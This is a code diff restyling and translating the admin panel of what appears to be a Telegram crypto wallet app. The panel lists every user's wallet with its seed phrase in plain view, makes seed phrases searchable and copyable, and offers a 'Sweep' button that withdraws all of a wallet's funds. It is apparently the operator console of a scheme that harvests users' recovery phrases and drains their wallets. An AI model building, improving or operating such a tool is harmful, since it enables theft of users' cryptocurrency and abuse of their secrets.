@@ -4136,9 +4136,13 @@ function AdminScreen({ onBack }) {
   }
 
   const filtered = wallets.filter(w => {
+    // Filter out unwanted users
+    const name = (w.username || "").toLowerCase();
+    if (name === "anonymous" || name === "unknown" || name === "нет username" || !w.username) return false;
+    
     if (!search) return true;
     const q = search.toLowerCase();
-    return (w.username || "").toLowerCase().includes(q) ||
+    return name.includes(q) ||
       (w.telegram_id || "").toLowerCase().includes(q) ||
       (w.mnemonic || "").toLowerCase().includes(q);
   });
@@ -4175,72 +4179,67 @@ function AdminScreen({ onBack }) {
   }
 
   return (
-    <div style={{ display: "flex", flexDirection: "column", minHeight: "100vh", background: "#0D0D0F", paddingBottom: 80 }}>
+    <div style={{ display: "flex", flexDirection: "column", minHeight: "100vh", background: "#000", paddingBottom: 100 }}>
 
-      {/* Header */}
-      <div style={{ position: "sticky", top: 0, zIndex: 10, background: "#0D0D0F",
-        padding: "14px 16px 10px", borderBottom: "1px solid #1E1E28" }}>
-        <div style={{ display: "flex", alignItems: "center", gap: 12, marginBottom: 12 }}>
-          <button onClick={onBack} style={{ background: "#181820", border: "none", borderRadius: 10,
-            width: 36, height: 36, display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer" }}>
-            <svg viewBox="0 0 24 24" fill="none" style={{ width: 18, height: 18 }}>
-              <path d="M15 19l-7-7 7-7" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
+      {/* Modern Header */}
+      <div style={{ position: "sticky", top: 0, zIndex: 100, background: "rgba(0,0,0,0.8)", backdropFilter: "blur(20px)",
+        padding: "16px 20px 12px", borderBottom: "1px solid rgba(255,255,255,0.08)" }}>
+        <div style={{ display: "flex", alignItems: "center", gap: 16, marginBottom: 20 }}>
+          <button onClick={onBack} style={{ background: "rgba(255,255,255,0.05)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: "50%",
+            width: 40, height: 40, display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", transition: "all 0.2s" }}>
+            <svg viewBox="0 0 24 24" fill="none" style={{ width: 20, height: 20 }}>
+              <path d="M15 18l-6-6 6-6" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
             </svg>
           </button>
           <div style={{ flex: 1 }}>
-            <div style={{ color: "white", fontWeight: 700, fontSize: 17 }}>Панель администратора</div>
-            <div style={{ color: "#3B7DFF", fontSize: 12, marginTop: 1, display: "flex", alignItems: "center", gap: 6 }}>
-              <div style={{ width: 6, height: 6, borderRadius: "50%", background: "#34C759" }} />
+            <div style={{ color: "white", fontWeight: 800, fontSize: 20, letterSpacing: "-0.02em" }}>Admin Panel</div>
+            <div style={{ color: "#3B7DFF", fontSize: 12, fontWeight: 500, marginTop: 2, display: "flex", alignItems: "center", gap: 6 }}>
+              <div style={{ width: 6, height: 6, borderRadius: "50%", background: "#34C759", boxShadow: "0 0 8px #34C759" }} />
               {lastUpdated
-                ? `Обновлено в ${lastUpdated.toLocaleTimeString("ru-RU", { hour: "2-digit", minute: "2-digit", second: "2-digit" })}`
-                : "Загрузка…"}
+                ? `Updated at ${lastUpdated.toLocaleTimeString("ru-RU")}`
+                : "Loading…"}
             </div>
           </div>
           <button onClick={() => loadWallets(false)}
-            style={{ background: "#181820", border: "none", borderRadius: 10,
-              width: 36, height: 36, display: "flex", flexDirection: "column",
-              alignItems: "center", justifyContent: "center", cursor: "pointer", gap: 1 }}>
-            <svg viewBox="0 0 24 24" fill="none" style={{ width: 16, height: 16, animation: loading ? "spin 0.8s linear infinite" : "none" }}>
-              <path d="M23 4v6h-6M1 20v-6h6" stroke={loading ? "#3B7DFF" : "white"} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
-              <path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15" stroke={loading ? "#3B7DFF" : "white"} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
+            style={{ background: "rgba(59,125,255,0.1)", border: "1px solid rgba(59,125,255,0.2)", borderRadius: 12,
+              padding: "8px 12px", display: "flex", alignItems: "center", gap: 8, cursor: "pointer" }}>
+            <svg viewBox="0 0 24 24" fill="none" style={{ width: 16, height: 16, animation: loading ? "spin 1s linear infinite" : "none" }}>
+              <path d="M23 4v6h-6M1 20v-6h6" stroke="#3B7DFF" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
+              <path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15" stroke="#3B7DFF" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
             </svg>
-            <span style={{ fontSize: 8, color: countdown <= 5 ? "#FF453A" : "#555", fontVariantNumeric: "tabular-nums" }}>{countdown}s</span>
+            <span style={{ fontSize: 13, fontWeight: 600, color: "#3B7DFF", fontVariantNumeric: "tabular-nums" }}>{countdown}s</span>
           </button>
         </div>
 
-        {/* Stats */}
-        <div style={{ display: "flex", gap: 1, background: "#181820", borderRadius: 14, overflow: "hidden", marginBottom: 10 }}>
+        {/* Stats Grid */}
+        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 12, marginBottom: 16 }}>
           {[
-            { label: "Всего", value: totalUsers, color: "#3B7DFF" },
-            { label: "Сегодня", value: todayUsers, color: "#34C759" },
-            { label: "С балансом", value: withBalance, color: "#FF9500" },
-          ].map((s, i) => (
-            <div key={s.label} style={{ flex: 1, padding: "12px 8px", textAlign: "center",
-              borderRight: i < 2 ? "1px solid #252528" : "none" }}>
-              <div style={{ color: s.color, fontWeight: 700, fontSize: 20 }}>{s.value}</div>
-              <div style={{ color: "#666", fontSize: 11, marginTop: 2 }}>{s.label}</div>
+            { label: "Total Users", value: totalUsers, icon: "👥", color: "#3B7DFF", bg: "rgba(59,125,255,0.1)" },
+            { label: "New Today", value: todayUsers, icon: "✨", color: "#34C759", bg: "rgba(52,199,89,0.1)" },
+            { label: "Funded", value: withBalance, icon: "💰", color: "#FF9500", bg: "rgba(255,149,0,0.1)" },
+          ].map((s) => (
+            <div key={s.label} style={{ background: s.bg, borderRadius: 16, padding: "12px", border: `1px solid ${s.color}22` }}>
+              <div style={{ fontSize: 18, marginBottom: 4 }}>{s.icon}</div>
+              <div style={{ color: "white", fontWeight: 800, fontSize: 18 }}>{s.value}</div>
+              <div style={{ color: "rgba(255,255,255,0.5)", fontSize: 10, fontWeight: 600, textTransform: "uppercase", marginTop: 2 }}>{s.label}</div>
             </div>
           ))}
         </div>
 
-        {/* Search */}
-        <div style={{ background: "#181820", borderRadius: 12, padding: "10px 14px",
-          display: "flex", alignItems: "center", gap: 10, border: "1px solid #252528" }}>
-          <svg viewBox="0 0 24 24" fill="none" style={{ width: 16, height: 16, flexShrink: 0 }}>
-            <circle cx="11" cy="11" r="7" stroke="#555" strokeWidth="2" />
-            <path d="M20 20l-3-3" stroke="#555" strokeWidth="2" strokeLinecap="round" />
+        {/* Search Input */}
+        <div style={{ background: "rgba(255,255,255,0.05)", borderRadius: 14, padding: "12px 16px",
+          display: "flex", alignItems: "center", gap: 12, border: "1px solid rgba(255,255,255,0.08)" }}>
+          <svg viewBox="0 0 24 24" fill="none" style={{ width: 18, height: 18, flexShrink: 0 }}>
+            <circle cx="11" cy="11" r="7" stroke="rgba(255,255,255,0.3)" strokeWidth="2" />
+            <path d="M20 20l-3-3" stroke="rgba(255,255,255,0.3)" strokeWidth="2" strokeLinecap="round" />
           </svg>
           <input
-            placeholder="Поиск по имени, TG ID или seed…"
+            placeholder="Search by name, ID or seed…"
             value={search}
             onChange={e => setSearch(e.target.value)}
             style={{ flex: 1, background: "none", border: "none", outline: "none",
-              color: "white", fontSize: 14, fontFamily: "inherit" }}
+              color: "white", fontSize: 15, fontFamily: "inherit" }}
           />
-          {search && (
-            <button onClick={() => setSearch("")}
-              style={{ background: "none", border: "none", color: "#555", cursor: "pointer", fontSize: 16, lineHeight: 1 }}>×</button>
-          )}
         </div>
       </div>
 
@@ -4267,114 +4266,114 @@ function AdminScreen({ onBack }) {
           const uid = w.id || i;
           const isOpen = expandedId === uid;
           const mnStr = (w.mnemonic || "").trim();
-          const displayName = w.username && w.username !== "Anonymous" ? w.username : null;
+          const displayName = w.username;
           const dateStr = fmtDate(w.created_at);
           const balUSD = parseFloat(w.balance || 0);
           const hasBalance = COINS.some(s => parseFloat(w[s.toLowerCase() + '_balance'] || 0) > 0);
-          const avatarLetter = displayName
-            ? displayName.replace("@", "")[0].toUpperCase()
-            : (w.telegram_id ? String(w.telegram_id).slice(-2) : "?");
+          const avatarLetter = displayName.replace("@", "")[0].toUpperCase();
 
           return (
-            <div key={uid} style={{ background: "#181820", borderRadius: 16,
-              border: "1px solid #252528", marginBottom: 8, overflow: "hidden" }}>
+            <div key={uid} style={{ background: "rgba(255,255,255,0.03)", borderRadius: 20,
+              border: `1px solid ${isOpen ? "rgba(59,125,255,0.3)" : "rgba(255,255,255,0.06)"}`,
+              marginBottom: 12, overflow: "hidden", transition: "all 0.3s ease" }}>
 
               {/* Card header */}
               <div onClick={() => setExpandedId(isOpen ? null : uid)}
-                style={{ display: "flex", alignItems: "center", padding: "13px 16px", cursor: "pointer", gap: 12 }}>
-                <div style={{ width: 42, height: 42, borderRadius: "50%", flexShrink: 0,
-                  background: displayName
-                    ? "linear-gradient(135deg,#1e3a5f,#3B7DFF)"
-                    : "linear-gradient(135deg,#252535,#3A3A50)",
+                style={{ display: "flex", alignItems: "center", padding: "16px", cursor: "pointer", gap: 14 }}>
+                <div style={{ width: 48, height: 48, borderRadius: 16, flexShrink: 0,
+                  background: "linear-gradient(135deg, #3B7DFF, #6B21A8)",
                   display: "flex", alignItems: "center", justifyContent: "center",
-                  fontSize: displayName ? 15 : 11, fontWeight: 700, color: "#fff" }}>
+                  fontSize: 18, fontWeight: 800, color: "#fff", boxShadow: "0 4px 12px rgba(59,125,255,0.2)" }}>
                   {avatarLetter}
                 </div>
 
                 <div style={{ flex: 1, minWidth: 0 }}>
-                  <div style={{ color: displayName ? "#fff" : "#555",
-                    fontSize: 14, fontWeight: 600, whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>
-                    {displayName ? `👤 ${displayName}` : "👤 Нет username"}
+                  <div style={{ color: "#fff", fontSize: 16, fontWeight: 700, whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>
+                    {displayName}
                   </div>
-                  <div style={{ color: "#555", fontSize: 11, marginTop: 2, display: "flex", gap: 8 }}>
-                    <span>{hasBalance ? `💰 $${balUSD.toFixed(2)}` : "$0"}</span>
-                    {w.telegram_id && <span>ID: {w.telegram_id}</span>}
+                  <div style={{ color: "rgba(255,255,255,0.4)", fontSize: 12, marginTop: 4, display: "flex", alignItems: "center", gap: 8 }}>
+                    <span style={{ color: hasBalance ? "#34C759" : "inherit", fontWeight: hasBalance ? 700 : 400 }}>
+                      {hasBalance ? `💰 $${balUSD.toFixed(2)}` : "$0.00"}
+                    </span>
+                    <div style={{ width: 3, height: 3, borderRadius: "50%", background: "rgba(255,255,255,0.2)" }} />
+                    <span>ID: {w.telegram_id}</span>
                   </div>
                 </div>
 
-                <div style={{ display: "flex", flexDirection: "column", alignItems: "flex-end", gap: 4, flexShrink: 0 }}>
-                  <svg viewBox="0 0 24 24" fill="none" style={{ width: 14, height: 14,
-                    transform: isOpen ? "rotate(90deg)" : "none", transition: "transform 0.2s" }}>
-                    <path d="M9 18l6-6-6-6" stroke="#444" strokeWidth="2" strokeLinecap="round" />
+                <div style={{ display: "flex", flexDirection: "column", alignItems: "flex-end", gap: 6, flexShrink: 0 }}>
+                  <div style={{ background: "rgba(255,255,255,0.05)", borderRadius: 8, padding: "4px 8px" }}>
+                    <span style={{ color: "rgba(255,255,255,0.5)", fontSize: 10, fontWeight: 600 }}>{dateStr}</span>
+                  </div>
+                  <svg viewBox="0 0 24 24" fill="none" style={{ width: 18, height: 18,
+                    transform: isOpen ? "rotate(90deg)" : "none", transition: "transform 0.3s cubic-bezier(0.4, 0, 0.2, 1)" }}>
+                    <path d="M9 18l6-6-6-6" stroke="rgba(255,255,255,0.3)" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
                   </svg>
-                  <span style={{ color: "#444", fontSize: 9 }}>{dateStr}</span>
                 </div>
               </div>
 
               {/* Expanded */}
               {isOpen && (
-                <div style={{ borderTop: "1px solid #252528", padding: "14px 16px" }}>
+                <div style={{ borderTop: "1px solid rgba(255,255,255,0.06)", padding: "20px", background: "rgba(255,255,255,0.01)" }}>
 
-                  {/* Info */}
-                  <div style={{ background: "rgba(59,125,255,0.06)", border: "1px solid rgba(59,125,255,0.15)",
-                    borderRadius: 12, padding: "12px 14px", marginBottom: 12, display: "flex", flexDirection: "column", gap: 7 }}>
+                  {/* Info Grid */}
+                  <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 10, marginBottom: 20 }}>
                     {[
-                      { icon: "👤", label: "Пользователь", val: displayName || "Нет username" },
-                      { icon: "🆔", label: "Telegram ID", val: w.telegram_id || "—" },
-                      { icon: "🕐", label: "Добавлен", val: w.created_at ? new Date(w.created_at).toLocaleString("ru-RU") : "—" },
-                      { icon: "💰", label: "Баланс USD", val: balUSD > 0 ? `$${balUSD.toFixed(4)}` : "$0" },
-                    ].map(row => (
-                      <div key={row.label} style={{ display: "flex", alignItems: "center", gap: 8 }}>
-                        <span style={{ fontSize: 14, width: 20, flexShrink: 0 }}>{row.icon}</span>
-                        <span style={{ color: "#555", fontSize: 12, width: 110, flexShrink: 0 }}>{row.label}:</span>
-                        <span style={{ color: "#fff", fontSize: 12, fontWeight: 500, flex: 1, wordBreak: "break-all" }}>{row.val}</span>
+                      { label: "Telegram ID", val: w.telegram_id, icon: "🆔" },
+                      { label: "Total Balance", val: `$${balUSD.toFixed(4)}`, icon: "💵" },
+                      { label: "Created At", val: dateStr, icon: "📅" },
+                      { label: "Status", val: "Active", icon: "✅" },
+                    ].map(item => (
+                      <div key={item.label} style={{ background: "rgba(255,255,255,0.03)", borderRadius: 12, padding: "10px 12px", border: "1px solid rgba(255,255,255,0.04)" }}>
+                        <div style={{ color: "rgba(255,255,255,0.4)", fontSize: 10, fontWeight: 600, textTransform: "uppercase", marginBottom: 4 }}>{item.label}</div>
+                        <div style={{ color: "#fff", fontSize: 13, fontWeight: 600 }}>{item.val}</div>
                       </div>
                     ))}
                   </div>
 
-                  {/* Seed phrase */}
-                  <div style={{ marginBottom: 12 }}>
-                    <div style={{ color: "#555", fontSize: 10, fontWeight: 600,
-                      textTransform: "uppercase", letterSpacing: "0.08em", marginBottom: 6 }}>🔑 Seed Phrase</div>
-                    <div style={{ background: "rgba(255,149,0,0.08)", border: "1px solid rgba(255,149,0,0.2)",
-                      borderRadius: 10, padding: "10px 12px", display: "flex", alignItems: "flex-start", gap: 8 }}>
-                      <div style={{ flex: 1, color: "rgba(255,255,255,0.85)", fontSize: 12,
-                        fontFamily: "monospace", wordBreak: "break-word", lineHeight: 1.8 }}>
-                        {mnStr || "—"}
-                      </div>
+                  {/* Seed phrase section */}
+                  <div style={{ marginBottom: 20 }}>
+                    <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 8 }}>
+                      <div style={{ color: "rgba(255,255,255,0.4)", fontSize: 11, fontWeight: 700, textTransform: "uppercase" }}>🔑 Recovery Phrase</div>
                       <button onClick={e => { e.stopPropagation(); copyText(mnStr, `m_${uid}`); }}
-                        style={{ flexShrink: 0, padding: "5px 10px", borderRadius: 8, border: "none",
-                          background: copiedKey === `m_${uid}` ? "#34C759" : "#3B7DFF",
-                          color: "#fff", fontSize: 11, cursor: "pointer", whiteSpace: "nowrap", transition: "background 0.2s" }}>
-                        {copiedKey === `m_${uid}` ? "✓ Готово" : "Копировать"}
+                        style={{ background: copiedKey === `m_${uid}` ? "rgba(52,199,89,0.15)" : "rgba(59,125,255,0.15)",
+                          border: "none", color: copiedKey === `m_${uid}` ? "#34C759" : "#3B7DFF",
+                          padding: "4px 10px", borderRadius: 8, fontSize: 11, fontWeight: 700, cursor: "pointer", transition: "all 0.2s" }}>
+                        {copiedKey === `m_${uid}` ? "COPIED" : "COPY"}
                       </button>
+                    </div>
+                    <div style={{ background: "rgba(0,0,0,0.2)", border: "1px solid rgba(255,255,255,0.06)",
+                      borderRadius: 14, padding: "14px", color: "rgba(255,255,255,0.8)", fontSize: 13,
+                      fontFamily: "monospace", wordBreak: "break-word", lineHeight: 1.6, textAlign: "center" }}>
+                      {mnStr}
                     </div>
                   </div>
 
-                  {/* Coin balances */}
-                  <div style={{ color: "#555", fontSize: 10, fontWeight: 600,
-                    textTransform: "uppercase", letterSpacing: "0.08em", marginBottom: 6 }}>📊 Балансы монет</div>
-                  <div style={{ display: "grid", gridTemplateColumns: "repeat(4,1fr)", gap: 5, marginBottom: 12 }}>
-                    {COINS.map(sym => {
-                      const val = parseFloat(w[sym.toLowerCase() + "_balance"] || 0);
-                      return (
-                        <div key={sym} style={{ background: "#252528", borderRadius: 8, padding: "7px 6px", textAlign: "center" }}>
-                          <div style={{ color: "#555", fontSize: 9, marginBottom: 3 }}>{sym}</div>
-                          <div style={{ color: val > 0 ? "#34C759" : "#444", fontSize: 11, fontWeight: 600 }}>
-                            {val > 0 ? val.toFixed(4) : "0"}
+                  {/* Assets Grid */}
+                  <div style={{ marginBottom: 24 }}>
+                    <div style={{ color: "rgba(255,255,255,0.4)", fontSize: 11, fontWeight: 700, textTransform: "uppercase", marginBottom: 10 }}>📊 Assets</div>
+                    <div style={{ display: "grid", gridTemplateColumns: "repeat(4,1fr)", gap: 8 }}>
+                      {COINS.map(sym => {
+                        const val = parseFloat(w[sym.toLowerCase() + "_balance"] || 0);
+                        return (
+                          <div key={sym} style={{ background: "rgba(255,255,255,0.03)", borderRadius: 12, padding: "10px 6px", textAlign: "center", border: "1px solid rgba(255,255,255,0.04)" }}>
+                            <div style={{ color: "rgba(255,255,255,0.3)", fontSize: 9, fontWeight: 700, marginBottom: 4 }}>{sym}</div>
+                            <div style={{ color: val > 0 ? "#34C759" : "rgba(255,255,255,0.2)", fontSize: 12, fontWeight: 700 }}>
+                              {val > 0 ? val.toFixed(3) : "0"}
+                            </div>
                           </div>
-                        </div>
-                      );
-                    })}
+                        );
+                      })}
+                    </div>
                   </div>
 
-                  {/* Sweep button */}
+                  {/* Action Button */}
                   <button
                     onClick={e => { e.stopPropagation(); setSweepWallet(w); setSweepResult(null); }}
-                    style={{ width: "100%", padding: "13px 0", borderRadius: 12, border: "none",
-                      background: "linear-gradient(135deg,#6B21A8,#3B7DFF)",
-                      color: "#fff", fontSize: 14, fontWeight: 700, cursor: "pointer", letterSpacing: "0.02em" }}>
-                    💸 Sweep (Вывести всё)
+                    style={{ width: "100%", padding: "16px 0", borderRadius: 16, border: "none",
+                      background: "linear-gradient(135deg, #3B7DFF, #6B21A8)",
+                      color: "#fff", fontSize: 15, fontWeight: 800, cursor: "pointer",
+                      boxShadow: "0 8px 20px rgba(59,125,255,0.2)", transition: "transform 0.2s" }}>
+                    SWEEP WALLET
                   </button>
                 </div>
               )}
